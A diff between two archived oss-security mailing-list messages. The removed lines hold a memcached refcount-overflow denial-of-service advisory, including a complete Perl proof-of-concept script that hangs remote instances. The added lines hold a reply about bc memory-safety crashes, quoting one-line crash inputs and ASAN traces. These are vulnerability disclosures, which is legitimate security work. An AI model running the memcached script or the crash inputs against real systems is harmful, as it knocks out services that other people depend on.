@@ -1,173 +1,146 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/03/08/7
-Message-ID: <alpine.DEB.2.20.1803081246570.25482@di7>
-Date: Thu, 8 Mar 2018 13:15:09 -0800 (PST)
-From: dormando <dormando@...ia.net>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/11/29/2
+Message-ID: <20181129091818.unk7zap2xiznptfc@suse.de>
+Date: Thu, 29 Nov 2018 10:18:18 +0100
+From: Marcus Meissner <meissner@...e.de>
 To: oss-security@...ts.openwall.com
-Subject: Re: Memcached remote DoS in older versions
+Subject: Re: memory safety bugs in bc
 Content-Type: text/plain; charset=utf-8
 
-> Hello,
->
-> There are a number of hang/crash bugs fixed in older versions of
-> memcached. All are noted in the release notes of the versions containing
-> the respective fixes, and most are years old.
->
-> I'm writing this in case pointing this out can help drive users to close
-> their instances from the internet; aside from participating in DDoS
-> attacks and remote users being able to read any data stored in the
-> instances, they can also be crashed or deadlocked.
+Hi Hanno,
 
-I've requested a CVE.
+(FWIW)
 
-After further testing, this particular flaw affects versions 1.4.11
-through 1.4.36.
-1.4.11 was released January 16th, 2012.
-1.4.37 (the fix) was released June 4th, 2017.
+Given Mitres guidance on "dcraw", as this is a standalone tool
+and only denial of service attacks I do not see a need for CVEs.
 
-The fix came from a user reporting deadlocks in running instances, caused
-by a bug in their application triggering this particular bug.
+Ciao, Marcus
 
-It's highly recommended that users not expose memcached directly to the
-internet, as this may allow malicious users to read contents of memory,
-remote DDoS via the UDP protocol, or crash and hang the instance.
+On Wed, Nov 28, 2018 at 01:31:45PM +0100, Hanno Böck wrote:
+> Hi,
+> 
+> bc is a command line calculator that is commonly available on Linux
+> systems.
+> 
+> I reported various memory safety bugs and crashes a long time ago, some
+> got also fixed but some more got ignored.
+> 
+> (I'm aware it's debatable whether a tool like bc should be considered
+> attack surface, as there are probably not many situations where it's fed
+> attacker controlled input.)
+> 
+> 
+> -----------------------------
+> 
+> echo 'define p(a[],u){}p(a[],0,0)'|./bc
+> 
+> Causes a heap out of bounds read, also segfaults without asan.
+> 
+> ASAN stack trace:
+> 
+> ==2068==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6020000001e8 at pc 0x5593e5e43b32 bp 0x7fffa5908ed0 sp 0x7fffa5908ec0
+> READ of size 8 at 0x6020000001e8 thread T0
+>     #0 0x5593e5e43b31 in process_params /mnt/ram/bc-1.07.1/bc/storage.c:1061
+>     #1 0x5593e5e39718 in execute /mnt/ram/bc-1.07.1/bc/execute.c:157
+>     #2 0x5593e5e44d26 in run_code /mnt/ram/bc-1.07.1/bc/util.c:295
+>     #3 0x5593e5e2df52 in yyparse ../../bc/bc.y:134
+>     #4 0x5593e5e2d0ea in main /mnt/ram/bc-1.07.1/bc/main.c:260
+>     #5 0x7f2b653a24ca in __libc_start_main (/lib64/libc.so.6+0x234ca)
+>     #6 0x5593e5e2c419 in _start (/mnt/ram/bc-1.07.1/bc/bc+0x9419)
+> 
+> 0x6020000001e8 is located 8 bytes to the left of 16-byte region [0x6020000001f0,0x602000000200)
+> allocated by thread T0 here:
+>     #0 0x7f2b65636b10 in malloc (/usr/lib/gcc/x86_64-pc-linux-gnu/8.2.0/libasan.so.5+0xedb10)
+>     #1 0x5593e5e46ac2 in bc_malloc /mnt/ram/bc-1.07.1/bc/util.c:652
+>     #2 0x5593e5e43c01 in nextarg /mnt/ram/bc-1.07.1/bc/util.c:58
+>     #3 0x5593e5e3e83a in load_code /mnt/ram/bc-1.07.1/bc/load.c:261
+>     #4 0x5593e5e44bf6 in generate /mnt/ram/bc-1.07.1/bc/util.c:277
+>     #5 0x5593e5e2fed8 in yyparse ../../bc/bc.y:352
+>     #6 0x5593e5e2d0ea in main /mnt/ram/bc-1.07.1/bc/main.c:260
+>     #7 0x7f2b653a24ca in __libc_start_main (/lib64/libc.so.6+0x234ca)
+> 
+> -----------------------------
+> 
+> echo -e 'define a(s,t){if(0)0}for(s=0;;){j(a(),0)}\ns'|./bc
+> 
+> Causes a null pointer deref, also crashes without asan.
+> 
+> ASAN trace:
+> ==2091==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x56201e2aafc8 bp 0x7fffb04d6d60 sp 0x7fffb04d6d40 T0)
+> ==2091==The signal is caused by a READ memory access.
+> ==2091==Hint: address points to the zero page.
+>     #0 0x56201e2aafc7 in load_var /mnt/ram/bc-1.07.1/bc/storage.c:653
+>     #1 0x56201e2a37c7 in execute /mnt/ram/bc-1.07.1/bc/execute.c:324
+>     #2 0x56201e2add26 in run_code /mnt/ram/bc-1.07.1/bc/util.c:295
+>     #3 0x56201e296f52 in yyparse ../../bc/bc.y:134
+>     #4 0x56201e2960ea in main /mnt/ram/bc-1.07.1/bc/main.c:260
+>     #5 0x7fbdbe7124ca in __libc_start_main (/lib64/libc.so.6+0x234ca)
+>     #6 0x56201e295419 in _start (/mnt/ram/bc-1.07.1/bc/bc+0x9419)
+> 
+> -----------------------------
+> 
+> echo -e 'define t(x,y,d,s){f()}\ndefine f(){t()}\nfor(s=0;;){f()}\nfor(s=0;;){}' | ./bc
+> 
+> null pointer read, but doesn't crash without asan.
+> 
+> ==6340==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x55fdb8a43d49 bp 0x7fffae7307e0 sp 0x7fffae7307d0 T0)
+> ==6340==The signal is caused by a READ memory access.
+> ==6340==Hint: address points to the zero page.
+>     #0 0x55fdb8a43d48 in bc_free_num /mnt/ram/bc-1.07.1/lib/number.c:92
+>     #1 0x55fdb8a3d32a in store_var /mnt/ram/bc-1.07.1/bc/storage.c:461
+>     #2 0x55fdb8a368cf in execute /mnt/ram/bc-1.07.1/bc/execute.c:339
+>     #3 0x55fdb8a40d26 in run_code /mnt/ram/bc-1.07.1/bc/util.c:295
+>     #4 0x55fdb8a29f52 in yyparse ../../bc/bc.y:134
+>     #5 0x55fdb8a290ea in main /mnt/ram/bc-1.07.1/bc/main.c:260
+>     #6 0x7f763973b4ca in __libc_start_main (/lib64/libc.so.6+0x234ca)
+>     #7 0x55fdb8a28419 in _start (/mnt/ram/bc-1.07.1/bc/bc+0x9419)
+> 
+> -----------------------------
+> 
+> echo -e 'define t(x,y,d,s,t){if(0){}\nfor(;0<y;)f(0)}define f(x){(t())}for(s=0;;){t(0,1,0,0,0)}\nt()'|./bc
+> 
+> null pointer read, but doesn't crash without asan.
+> 
+> ==6365==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x55d4e78cfd9c bp 0x7ffc83b7d590 sp 0x7ffc83b7d560 T0)
+> ==6365==The signal is caused by a READ memory access.
+> ==6365==Hint: address points to the zero page.
+>     #0 0x55d4e78cfd9b in pop_vars /mnt/ram/bc-1.07.1/bc/storage.c:921
+>     #1 0x55d4e78c91e8 in execute /mnt/ram/bc-1.07.1/bc/execute.c:538
+>     #2 0x55d4e78d1d26 in run_code /mnt/ram/bc-1.07.1/bc/util.c:295
+>     #3 0x55d4e78baf52 in yyparse ../../bc/bc.y:134
+>     #4 0x55d4e78ba0ea in main /mnt/ram/bc-1.07.1/bc/main.c:260
+>     #5 0x7f9c3f6bb4ca in __libc_start_main (/lib64/libc.so.6+0x234ca)
+>     #6 0x55d4e78b9419 in _start (/mnt/ram/bc-1.07.1/bc/bc+0x9419)
+> 
+> -----------------------------
+> 
+> echo 'define m(x){for(;;)0}m(b[])'|./bc
+> 
+> null pointer read, but doesn't crash without asan.
+> 
+> ==6373==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7f7fd8cdaec2 bp 0x7ffd4d86c230 sp 0x7ffd4d86b958 T0)
+> ==6373==The signal is caused by a READ memory access.
+> ==6373==Hint: address points to the zero page.
+>     #0 0x7f7fd8cdaec1  (/usr/lib/gcc/x86_64-pc-linux-gnu/8.2.0/libasan.so.5+0x108ec1)
+>     #1 0x7f7fd8c1f76c  (/usr/lib/gcc/x86_64-pc-linux-gnu/8.2.0/libasan.so.5+0x4d76c)
+>     #2 0x7f7fd8c200a4 in __interceptor_vfprintf (/usr/lib/gcc/x86_64-pc-linux-gnu/8.2.0/libasan.so.5+0x4e0a4)
+>     #3 0x561fe31fc5e6 in rt_error /mnt/ram/bc-1.07.1/bc/util.c:788
+>     #4 0x561fe31f8aed in process_params /mnt/ram/bc-1.07.1/bc/storage.c:1050
+>     #5 0x561fe31ee718 in execute /mnt/ram/bc-1.07.1/bc/execute.c:157
+>     #6 0x561fe31f9d26 in run_code /mnt/ram/bc-1.07.1/bc/util.c:295
+>     #7 0x561fe31e2f52 in yyparse ../../bc/bc.y:134
+>     #8 0x561fe31e20ea in main /mnt/ram/bc-1.07.1/bc/main.c:260
+>     #9 0x7f7fd8a2b4ca in __libc_start_main (/lib64/libc.so.6+0x234ca)
+>     #10 0x561fe31e1419 in _start (/mnt/ram/bc-1.07.1/bc/bc+0x9419)
+> 
+> 
+> -- 
+> Hanno Böck
+> https://hboeck.de/
+> 
+> mail/jabber: hanno@...eck.de
+> GPG: FE73757FA60E4E21B937579FA5880072BBB51E42
+> 
 
-There are also likely other similar issues in even older code.
-
-DESCRIPTION
-===========
-
-In versions 1.4.9-11, the items.c:item_remove() was refactored as part of
-a thread scalability project. The function will free an item back to slab
-memory if the reference count has dropped to zero, *and* the item is no
-longer referenced in the hash table + LRU. In .11, the secondary check for
-ITEM_LINKED bit was not re-added after a bug fix.
-
-An integer overflow bug has existed as long as memcached has, where many
-gets for the same key (> 2^16 in a single multiget or across many slow
-connections) can cause the refcount value to overflow.
-
-After .11, the item will automatically free while still being linked in
-the LRU and hash table. This allows the memory to be reused for a
-different item, while still existing in the hash table + LRU.
-
-Items contain embedded NEXT and PREV links for the LRU. This memory is not
-explicitly cleared when items return to the slab allocator.
-
-If this bug is hit multiple times, it can cause data corruption, loops in
-the LRU, or loops in hash chain buckets where no valid key is found.
-
-IMPACT
-======
-
-Instances with loops in the LRU's and hash chains can cause a worker
-thread to spin CPU while holding various locks (cache_lock in older
-versions, item locks in newer ones). Other worker threads can then hang by
-requesting the same item lock. The daemon then requires a restart to
-become functional again.
-
-I've only tested this against local instances built directly from source.
-It is not known to me if long running instances are vulnerable.
-
-MITIGATION
-==========
-
-Do not expose memcached to untrusted clients. No software mitigations are
-known beyond upgrading.
-
-RESOLUTION
-==========
-
-Versions 1.4.37 and newer prevent trivial refcount overflows. Running the
-latest version with UDP disabled is highly recommended in general.
-
-The specific fix is in:
-https://github.com/memcached/memcached/commit/a8c4a82787b8b6c256d61bd5c42fb7f92d1bae00
-
-If anyone wishes to backport. It is also possible to limit the impact of
-the problem by re-adding the ITEM_LINKED bit check in item_remove().
-
-POC FOLLOWS
-===========
-
-#!/usr/bin/perl
-# It may be necessary to run a "flush_all" for this to work on long running
-# instances.
-
-use warnings;
-use strict;
-
-use IO::Socket::INET;
-
-my $s = IO::Socket::INET->new(PeerAddr => $ARGV[0], Timeout => 4);
-die unless $s;
-
-my $USE_SIZES = 0;
-
-print $s "version\r\n";
-my $r = <$s>;
-if ($r =~ m/^VERSION 1\.5\./) {
-    die "unaffected";
-} elsif ($r =~ m/^VERSION 1\.(\d+)\.(\d+)/) {
-    die "unaffected" if ($1 == 4 && $2 > 36)
-        || ($1 == 4 && $2 < 11)
-        || ($1 < 4);
-    if (($1 == 4 && $2 < 25) ) {
-        print "using 'stats sizes' for < 1.4.25\n";
-        $USE_SIZES = 1;
-    }
-} else {
-    die "Unknown/unaffected";
-}
-
-$SIG{ALRM} = sub { die "dead\n" };
-
-my $get = 'dd ' x 65540;
-chop $get;
-my $count = 0;
-while (1) {
-    eval {
-        print "break\n";
-        alarm 20;
-        print $s "version\r\n";
-        $r = <$s>;
-        print $s "set dd 0 0 2\r\nno\r\n";
-        $r = <$s>;
-        print $s "get $get\r\n";
-        wait_end($s);
-        print $s "get dd\r\n";
-        wait_end($s);
-        if ($USE_SIZES && $count > 10) {
-            # stats sizes infinite loop while holding cache_lock
-            print $s "set foo 0 0 2\r\nok\r\n";
-            $r = <$s>;
-            print $s "stats sizes\r\n";
-            wait_end($s);
-            $count = 0;
-        }
-        alarm 0;
-        $count++;
-    };
-    if ($@ && $@ eq "dead\n") {
-        print "hang\n";
-        eval {
-            alarm 10;
-            # hang other worker threads on stuck item lock
-            for (1..50) {
-                $s = IO::Socket::INET->new(PeerAddr => $ARGV[0], Timeout => 4);
-                print $s "get dd\r\n";
-            }
-        };
-        die "done";
-    } elsif ($@) {
-        die $@;
-    }
-}
-
-sub wait_end {
-    my $s = shift;
-    while (1) {
-        my $r = <$s>;
-        last if $r =~ m/END/;
-    }
-}
+-- 
+Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi. 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <meissner@...e.de>
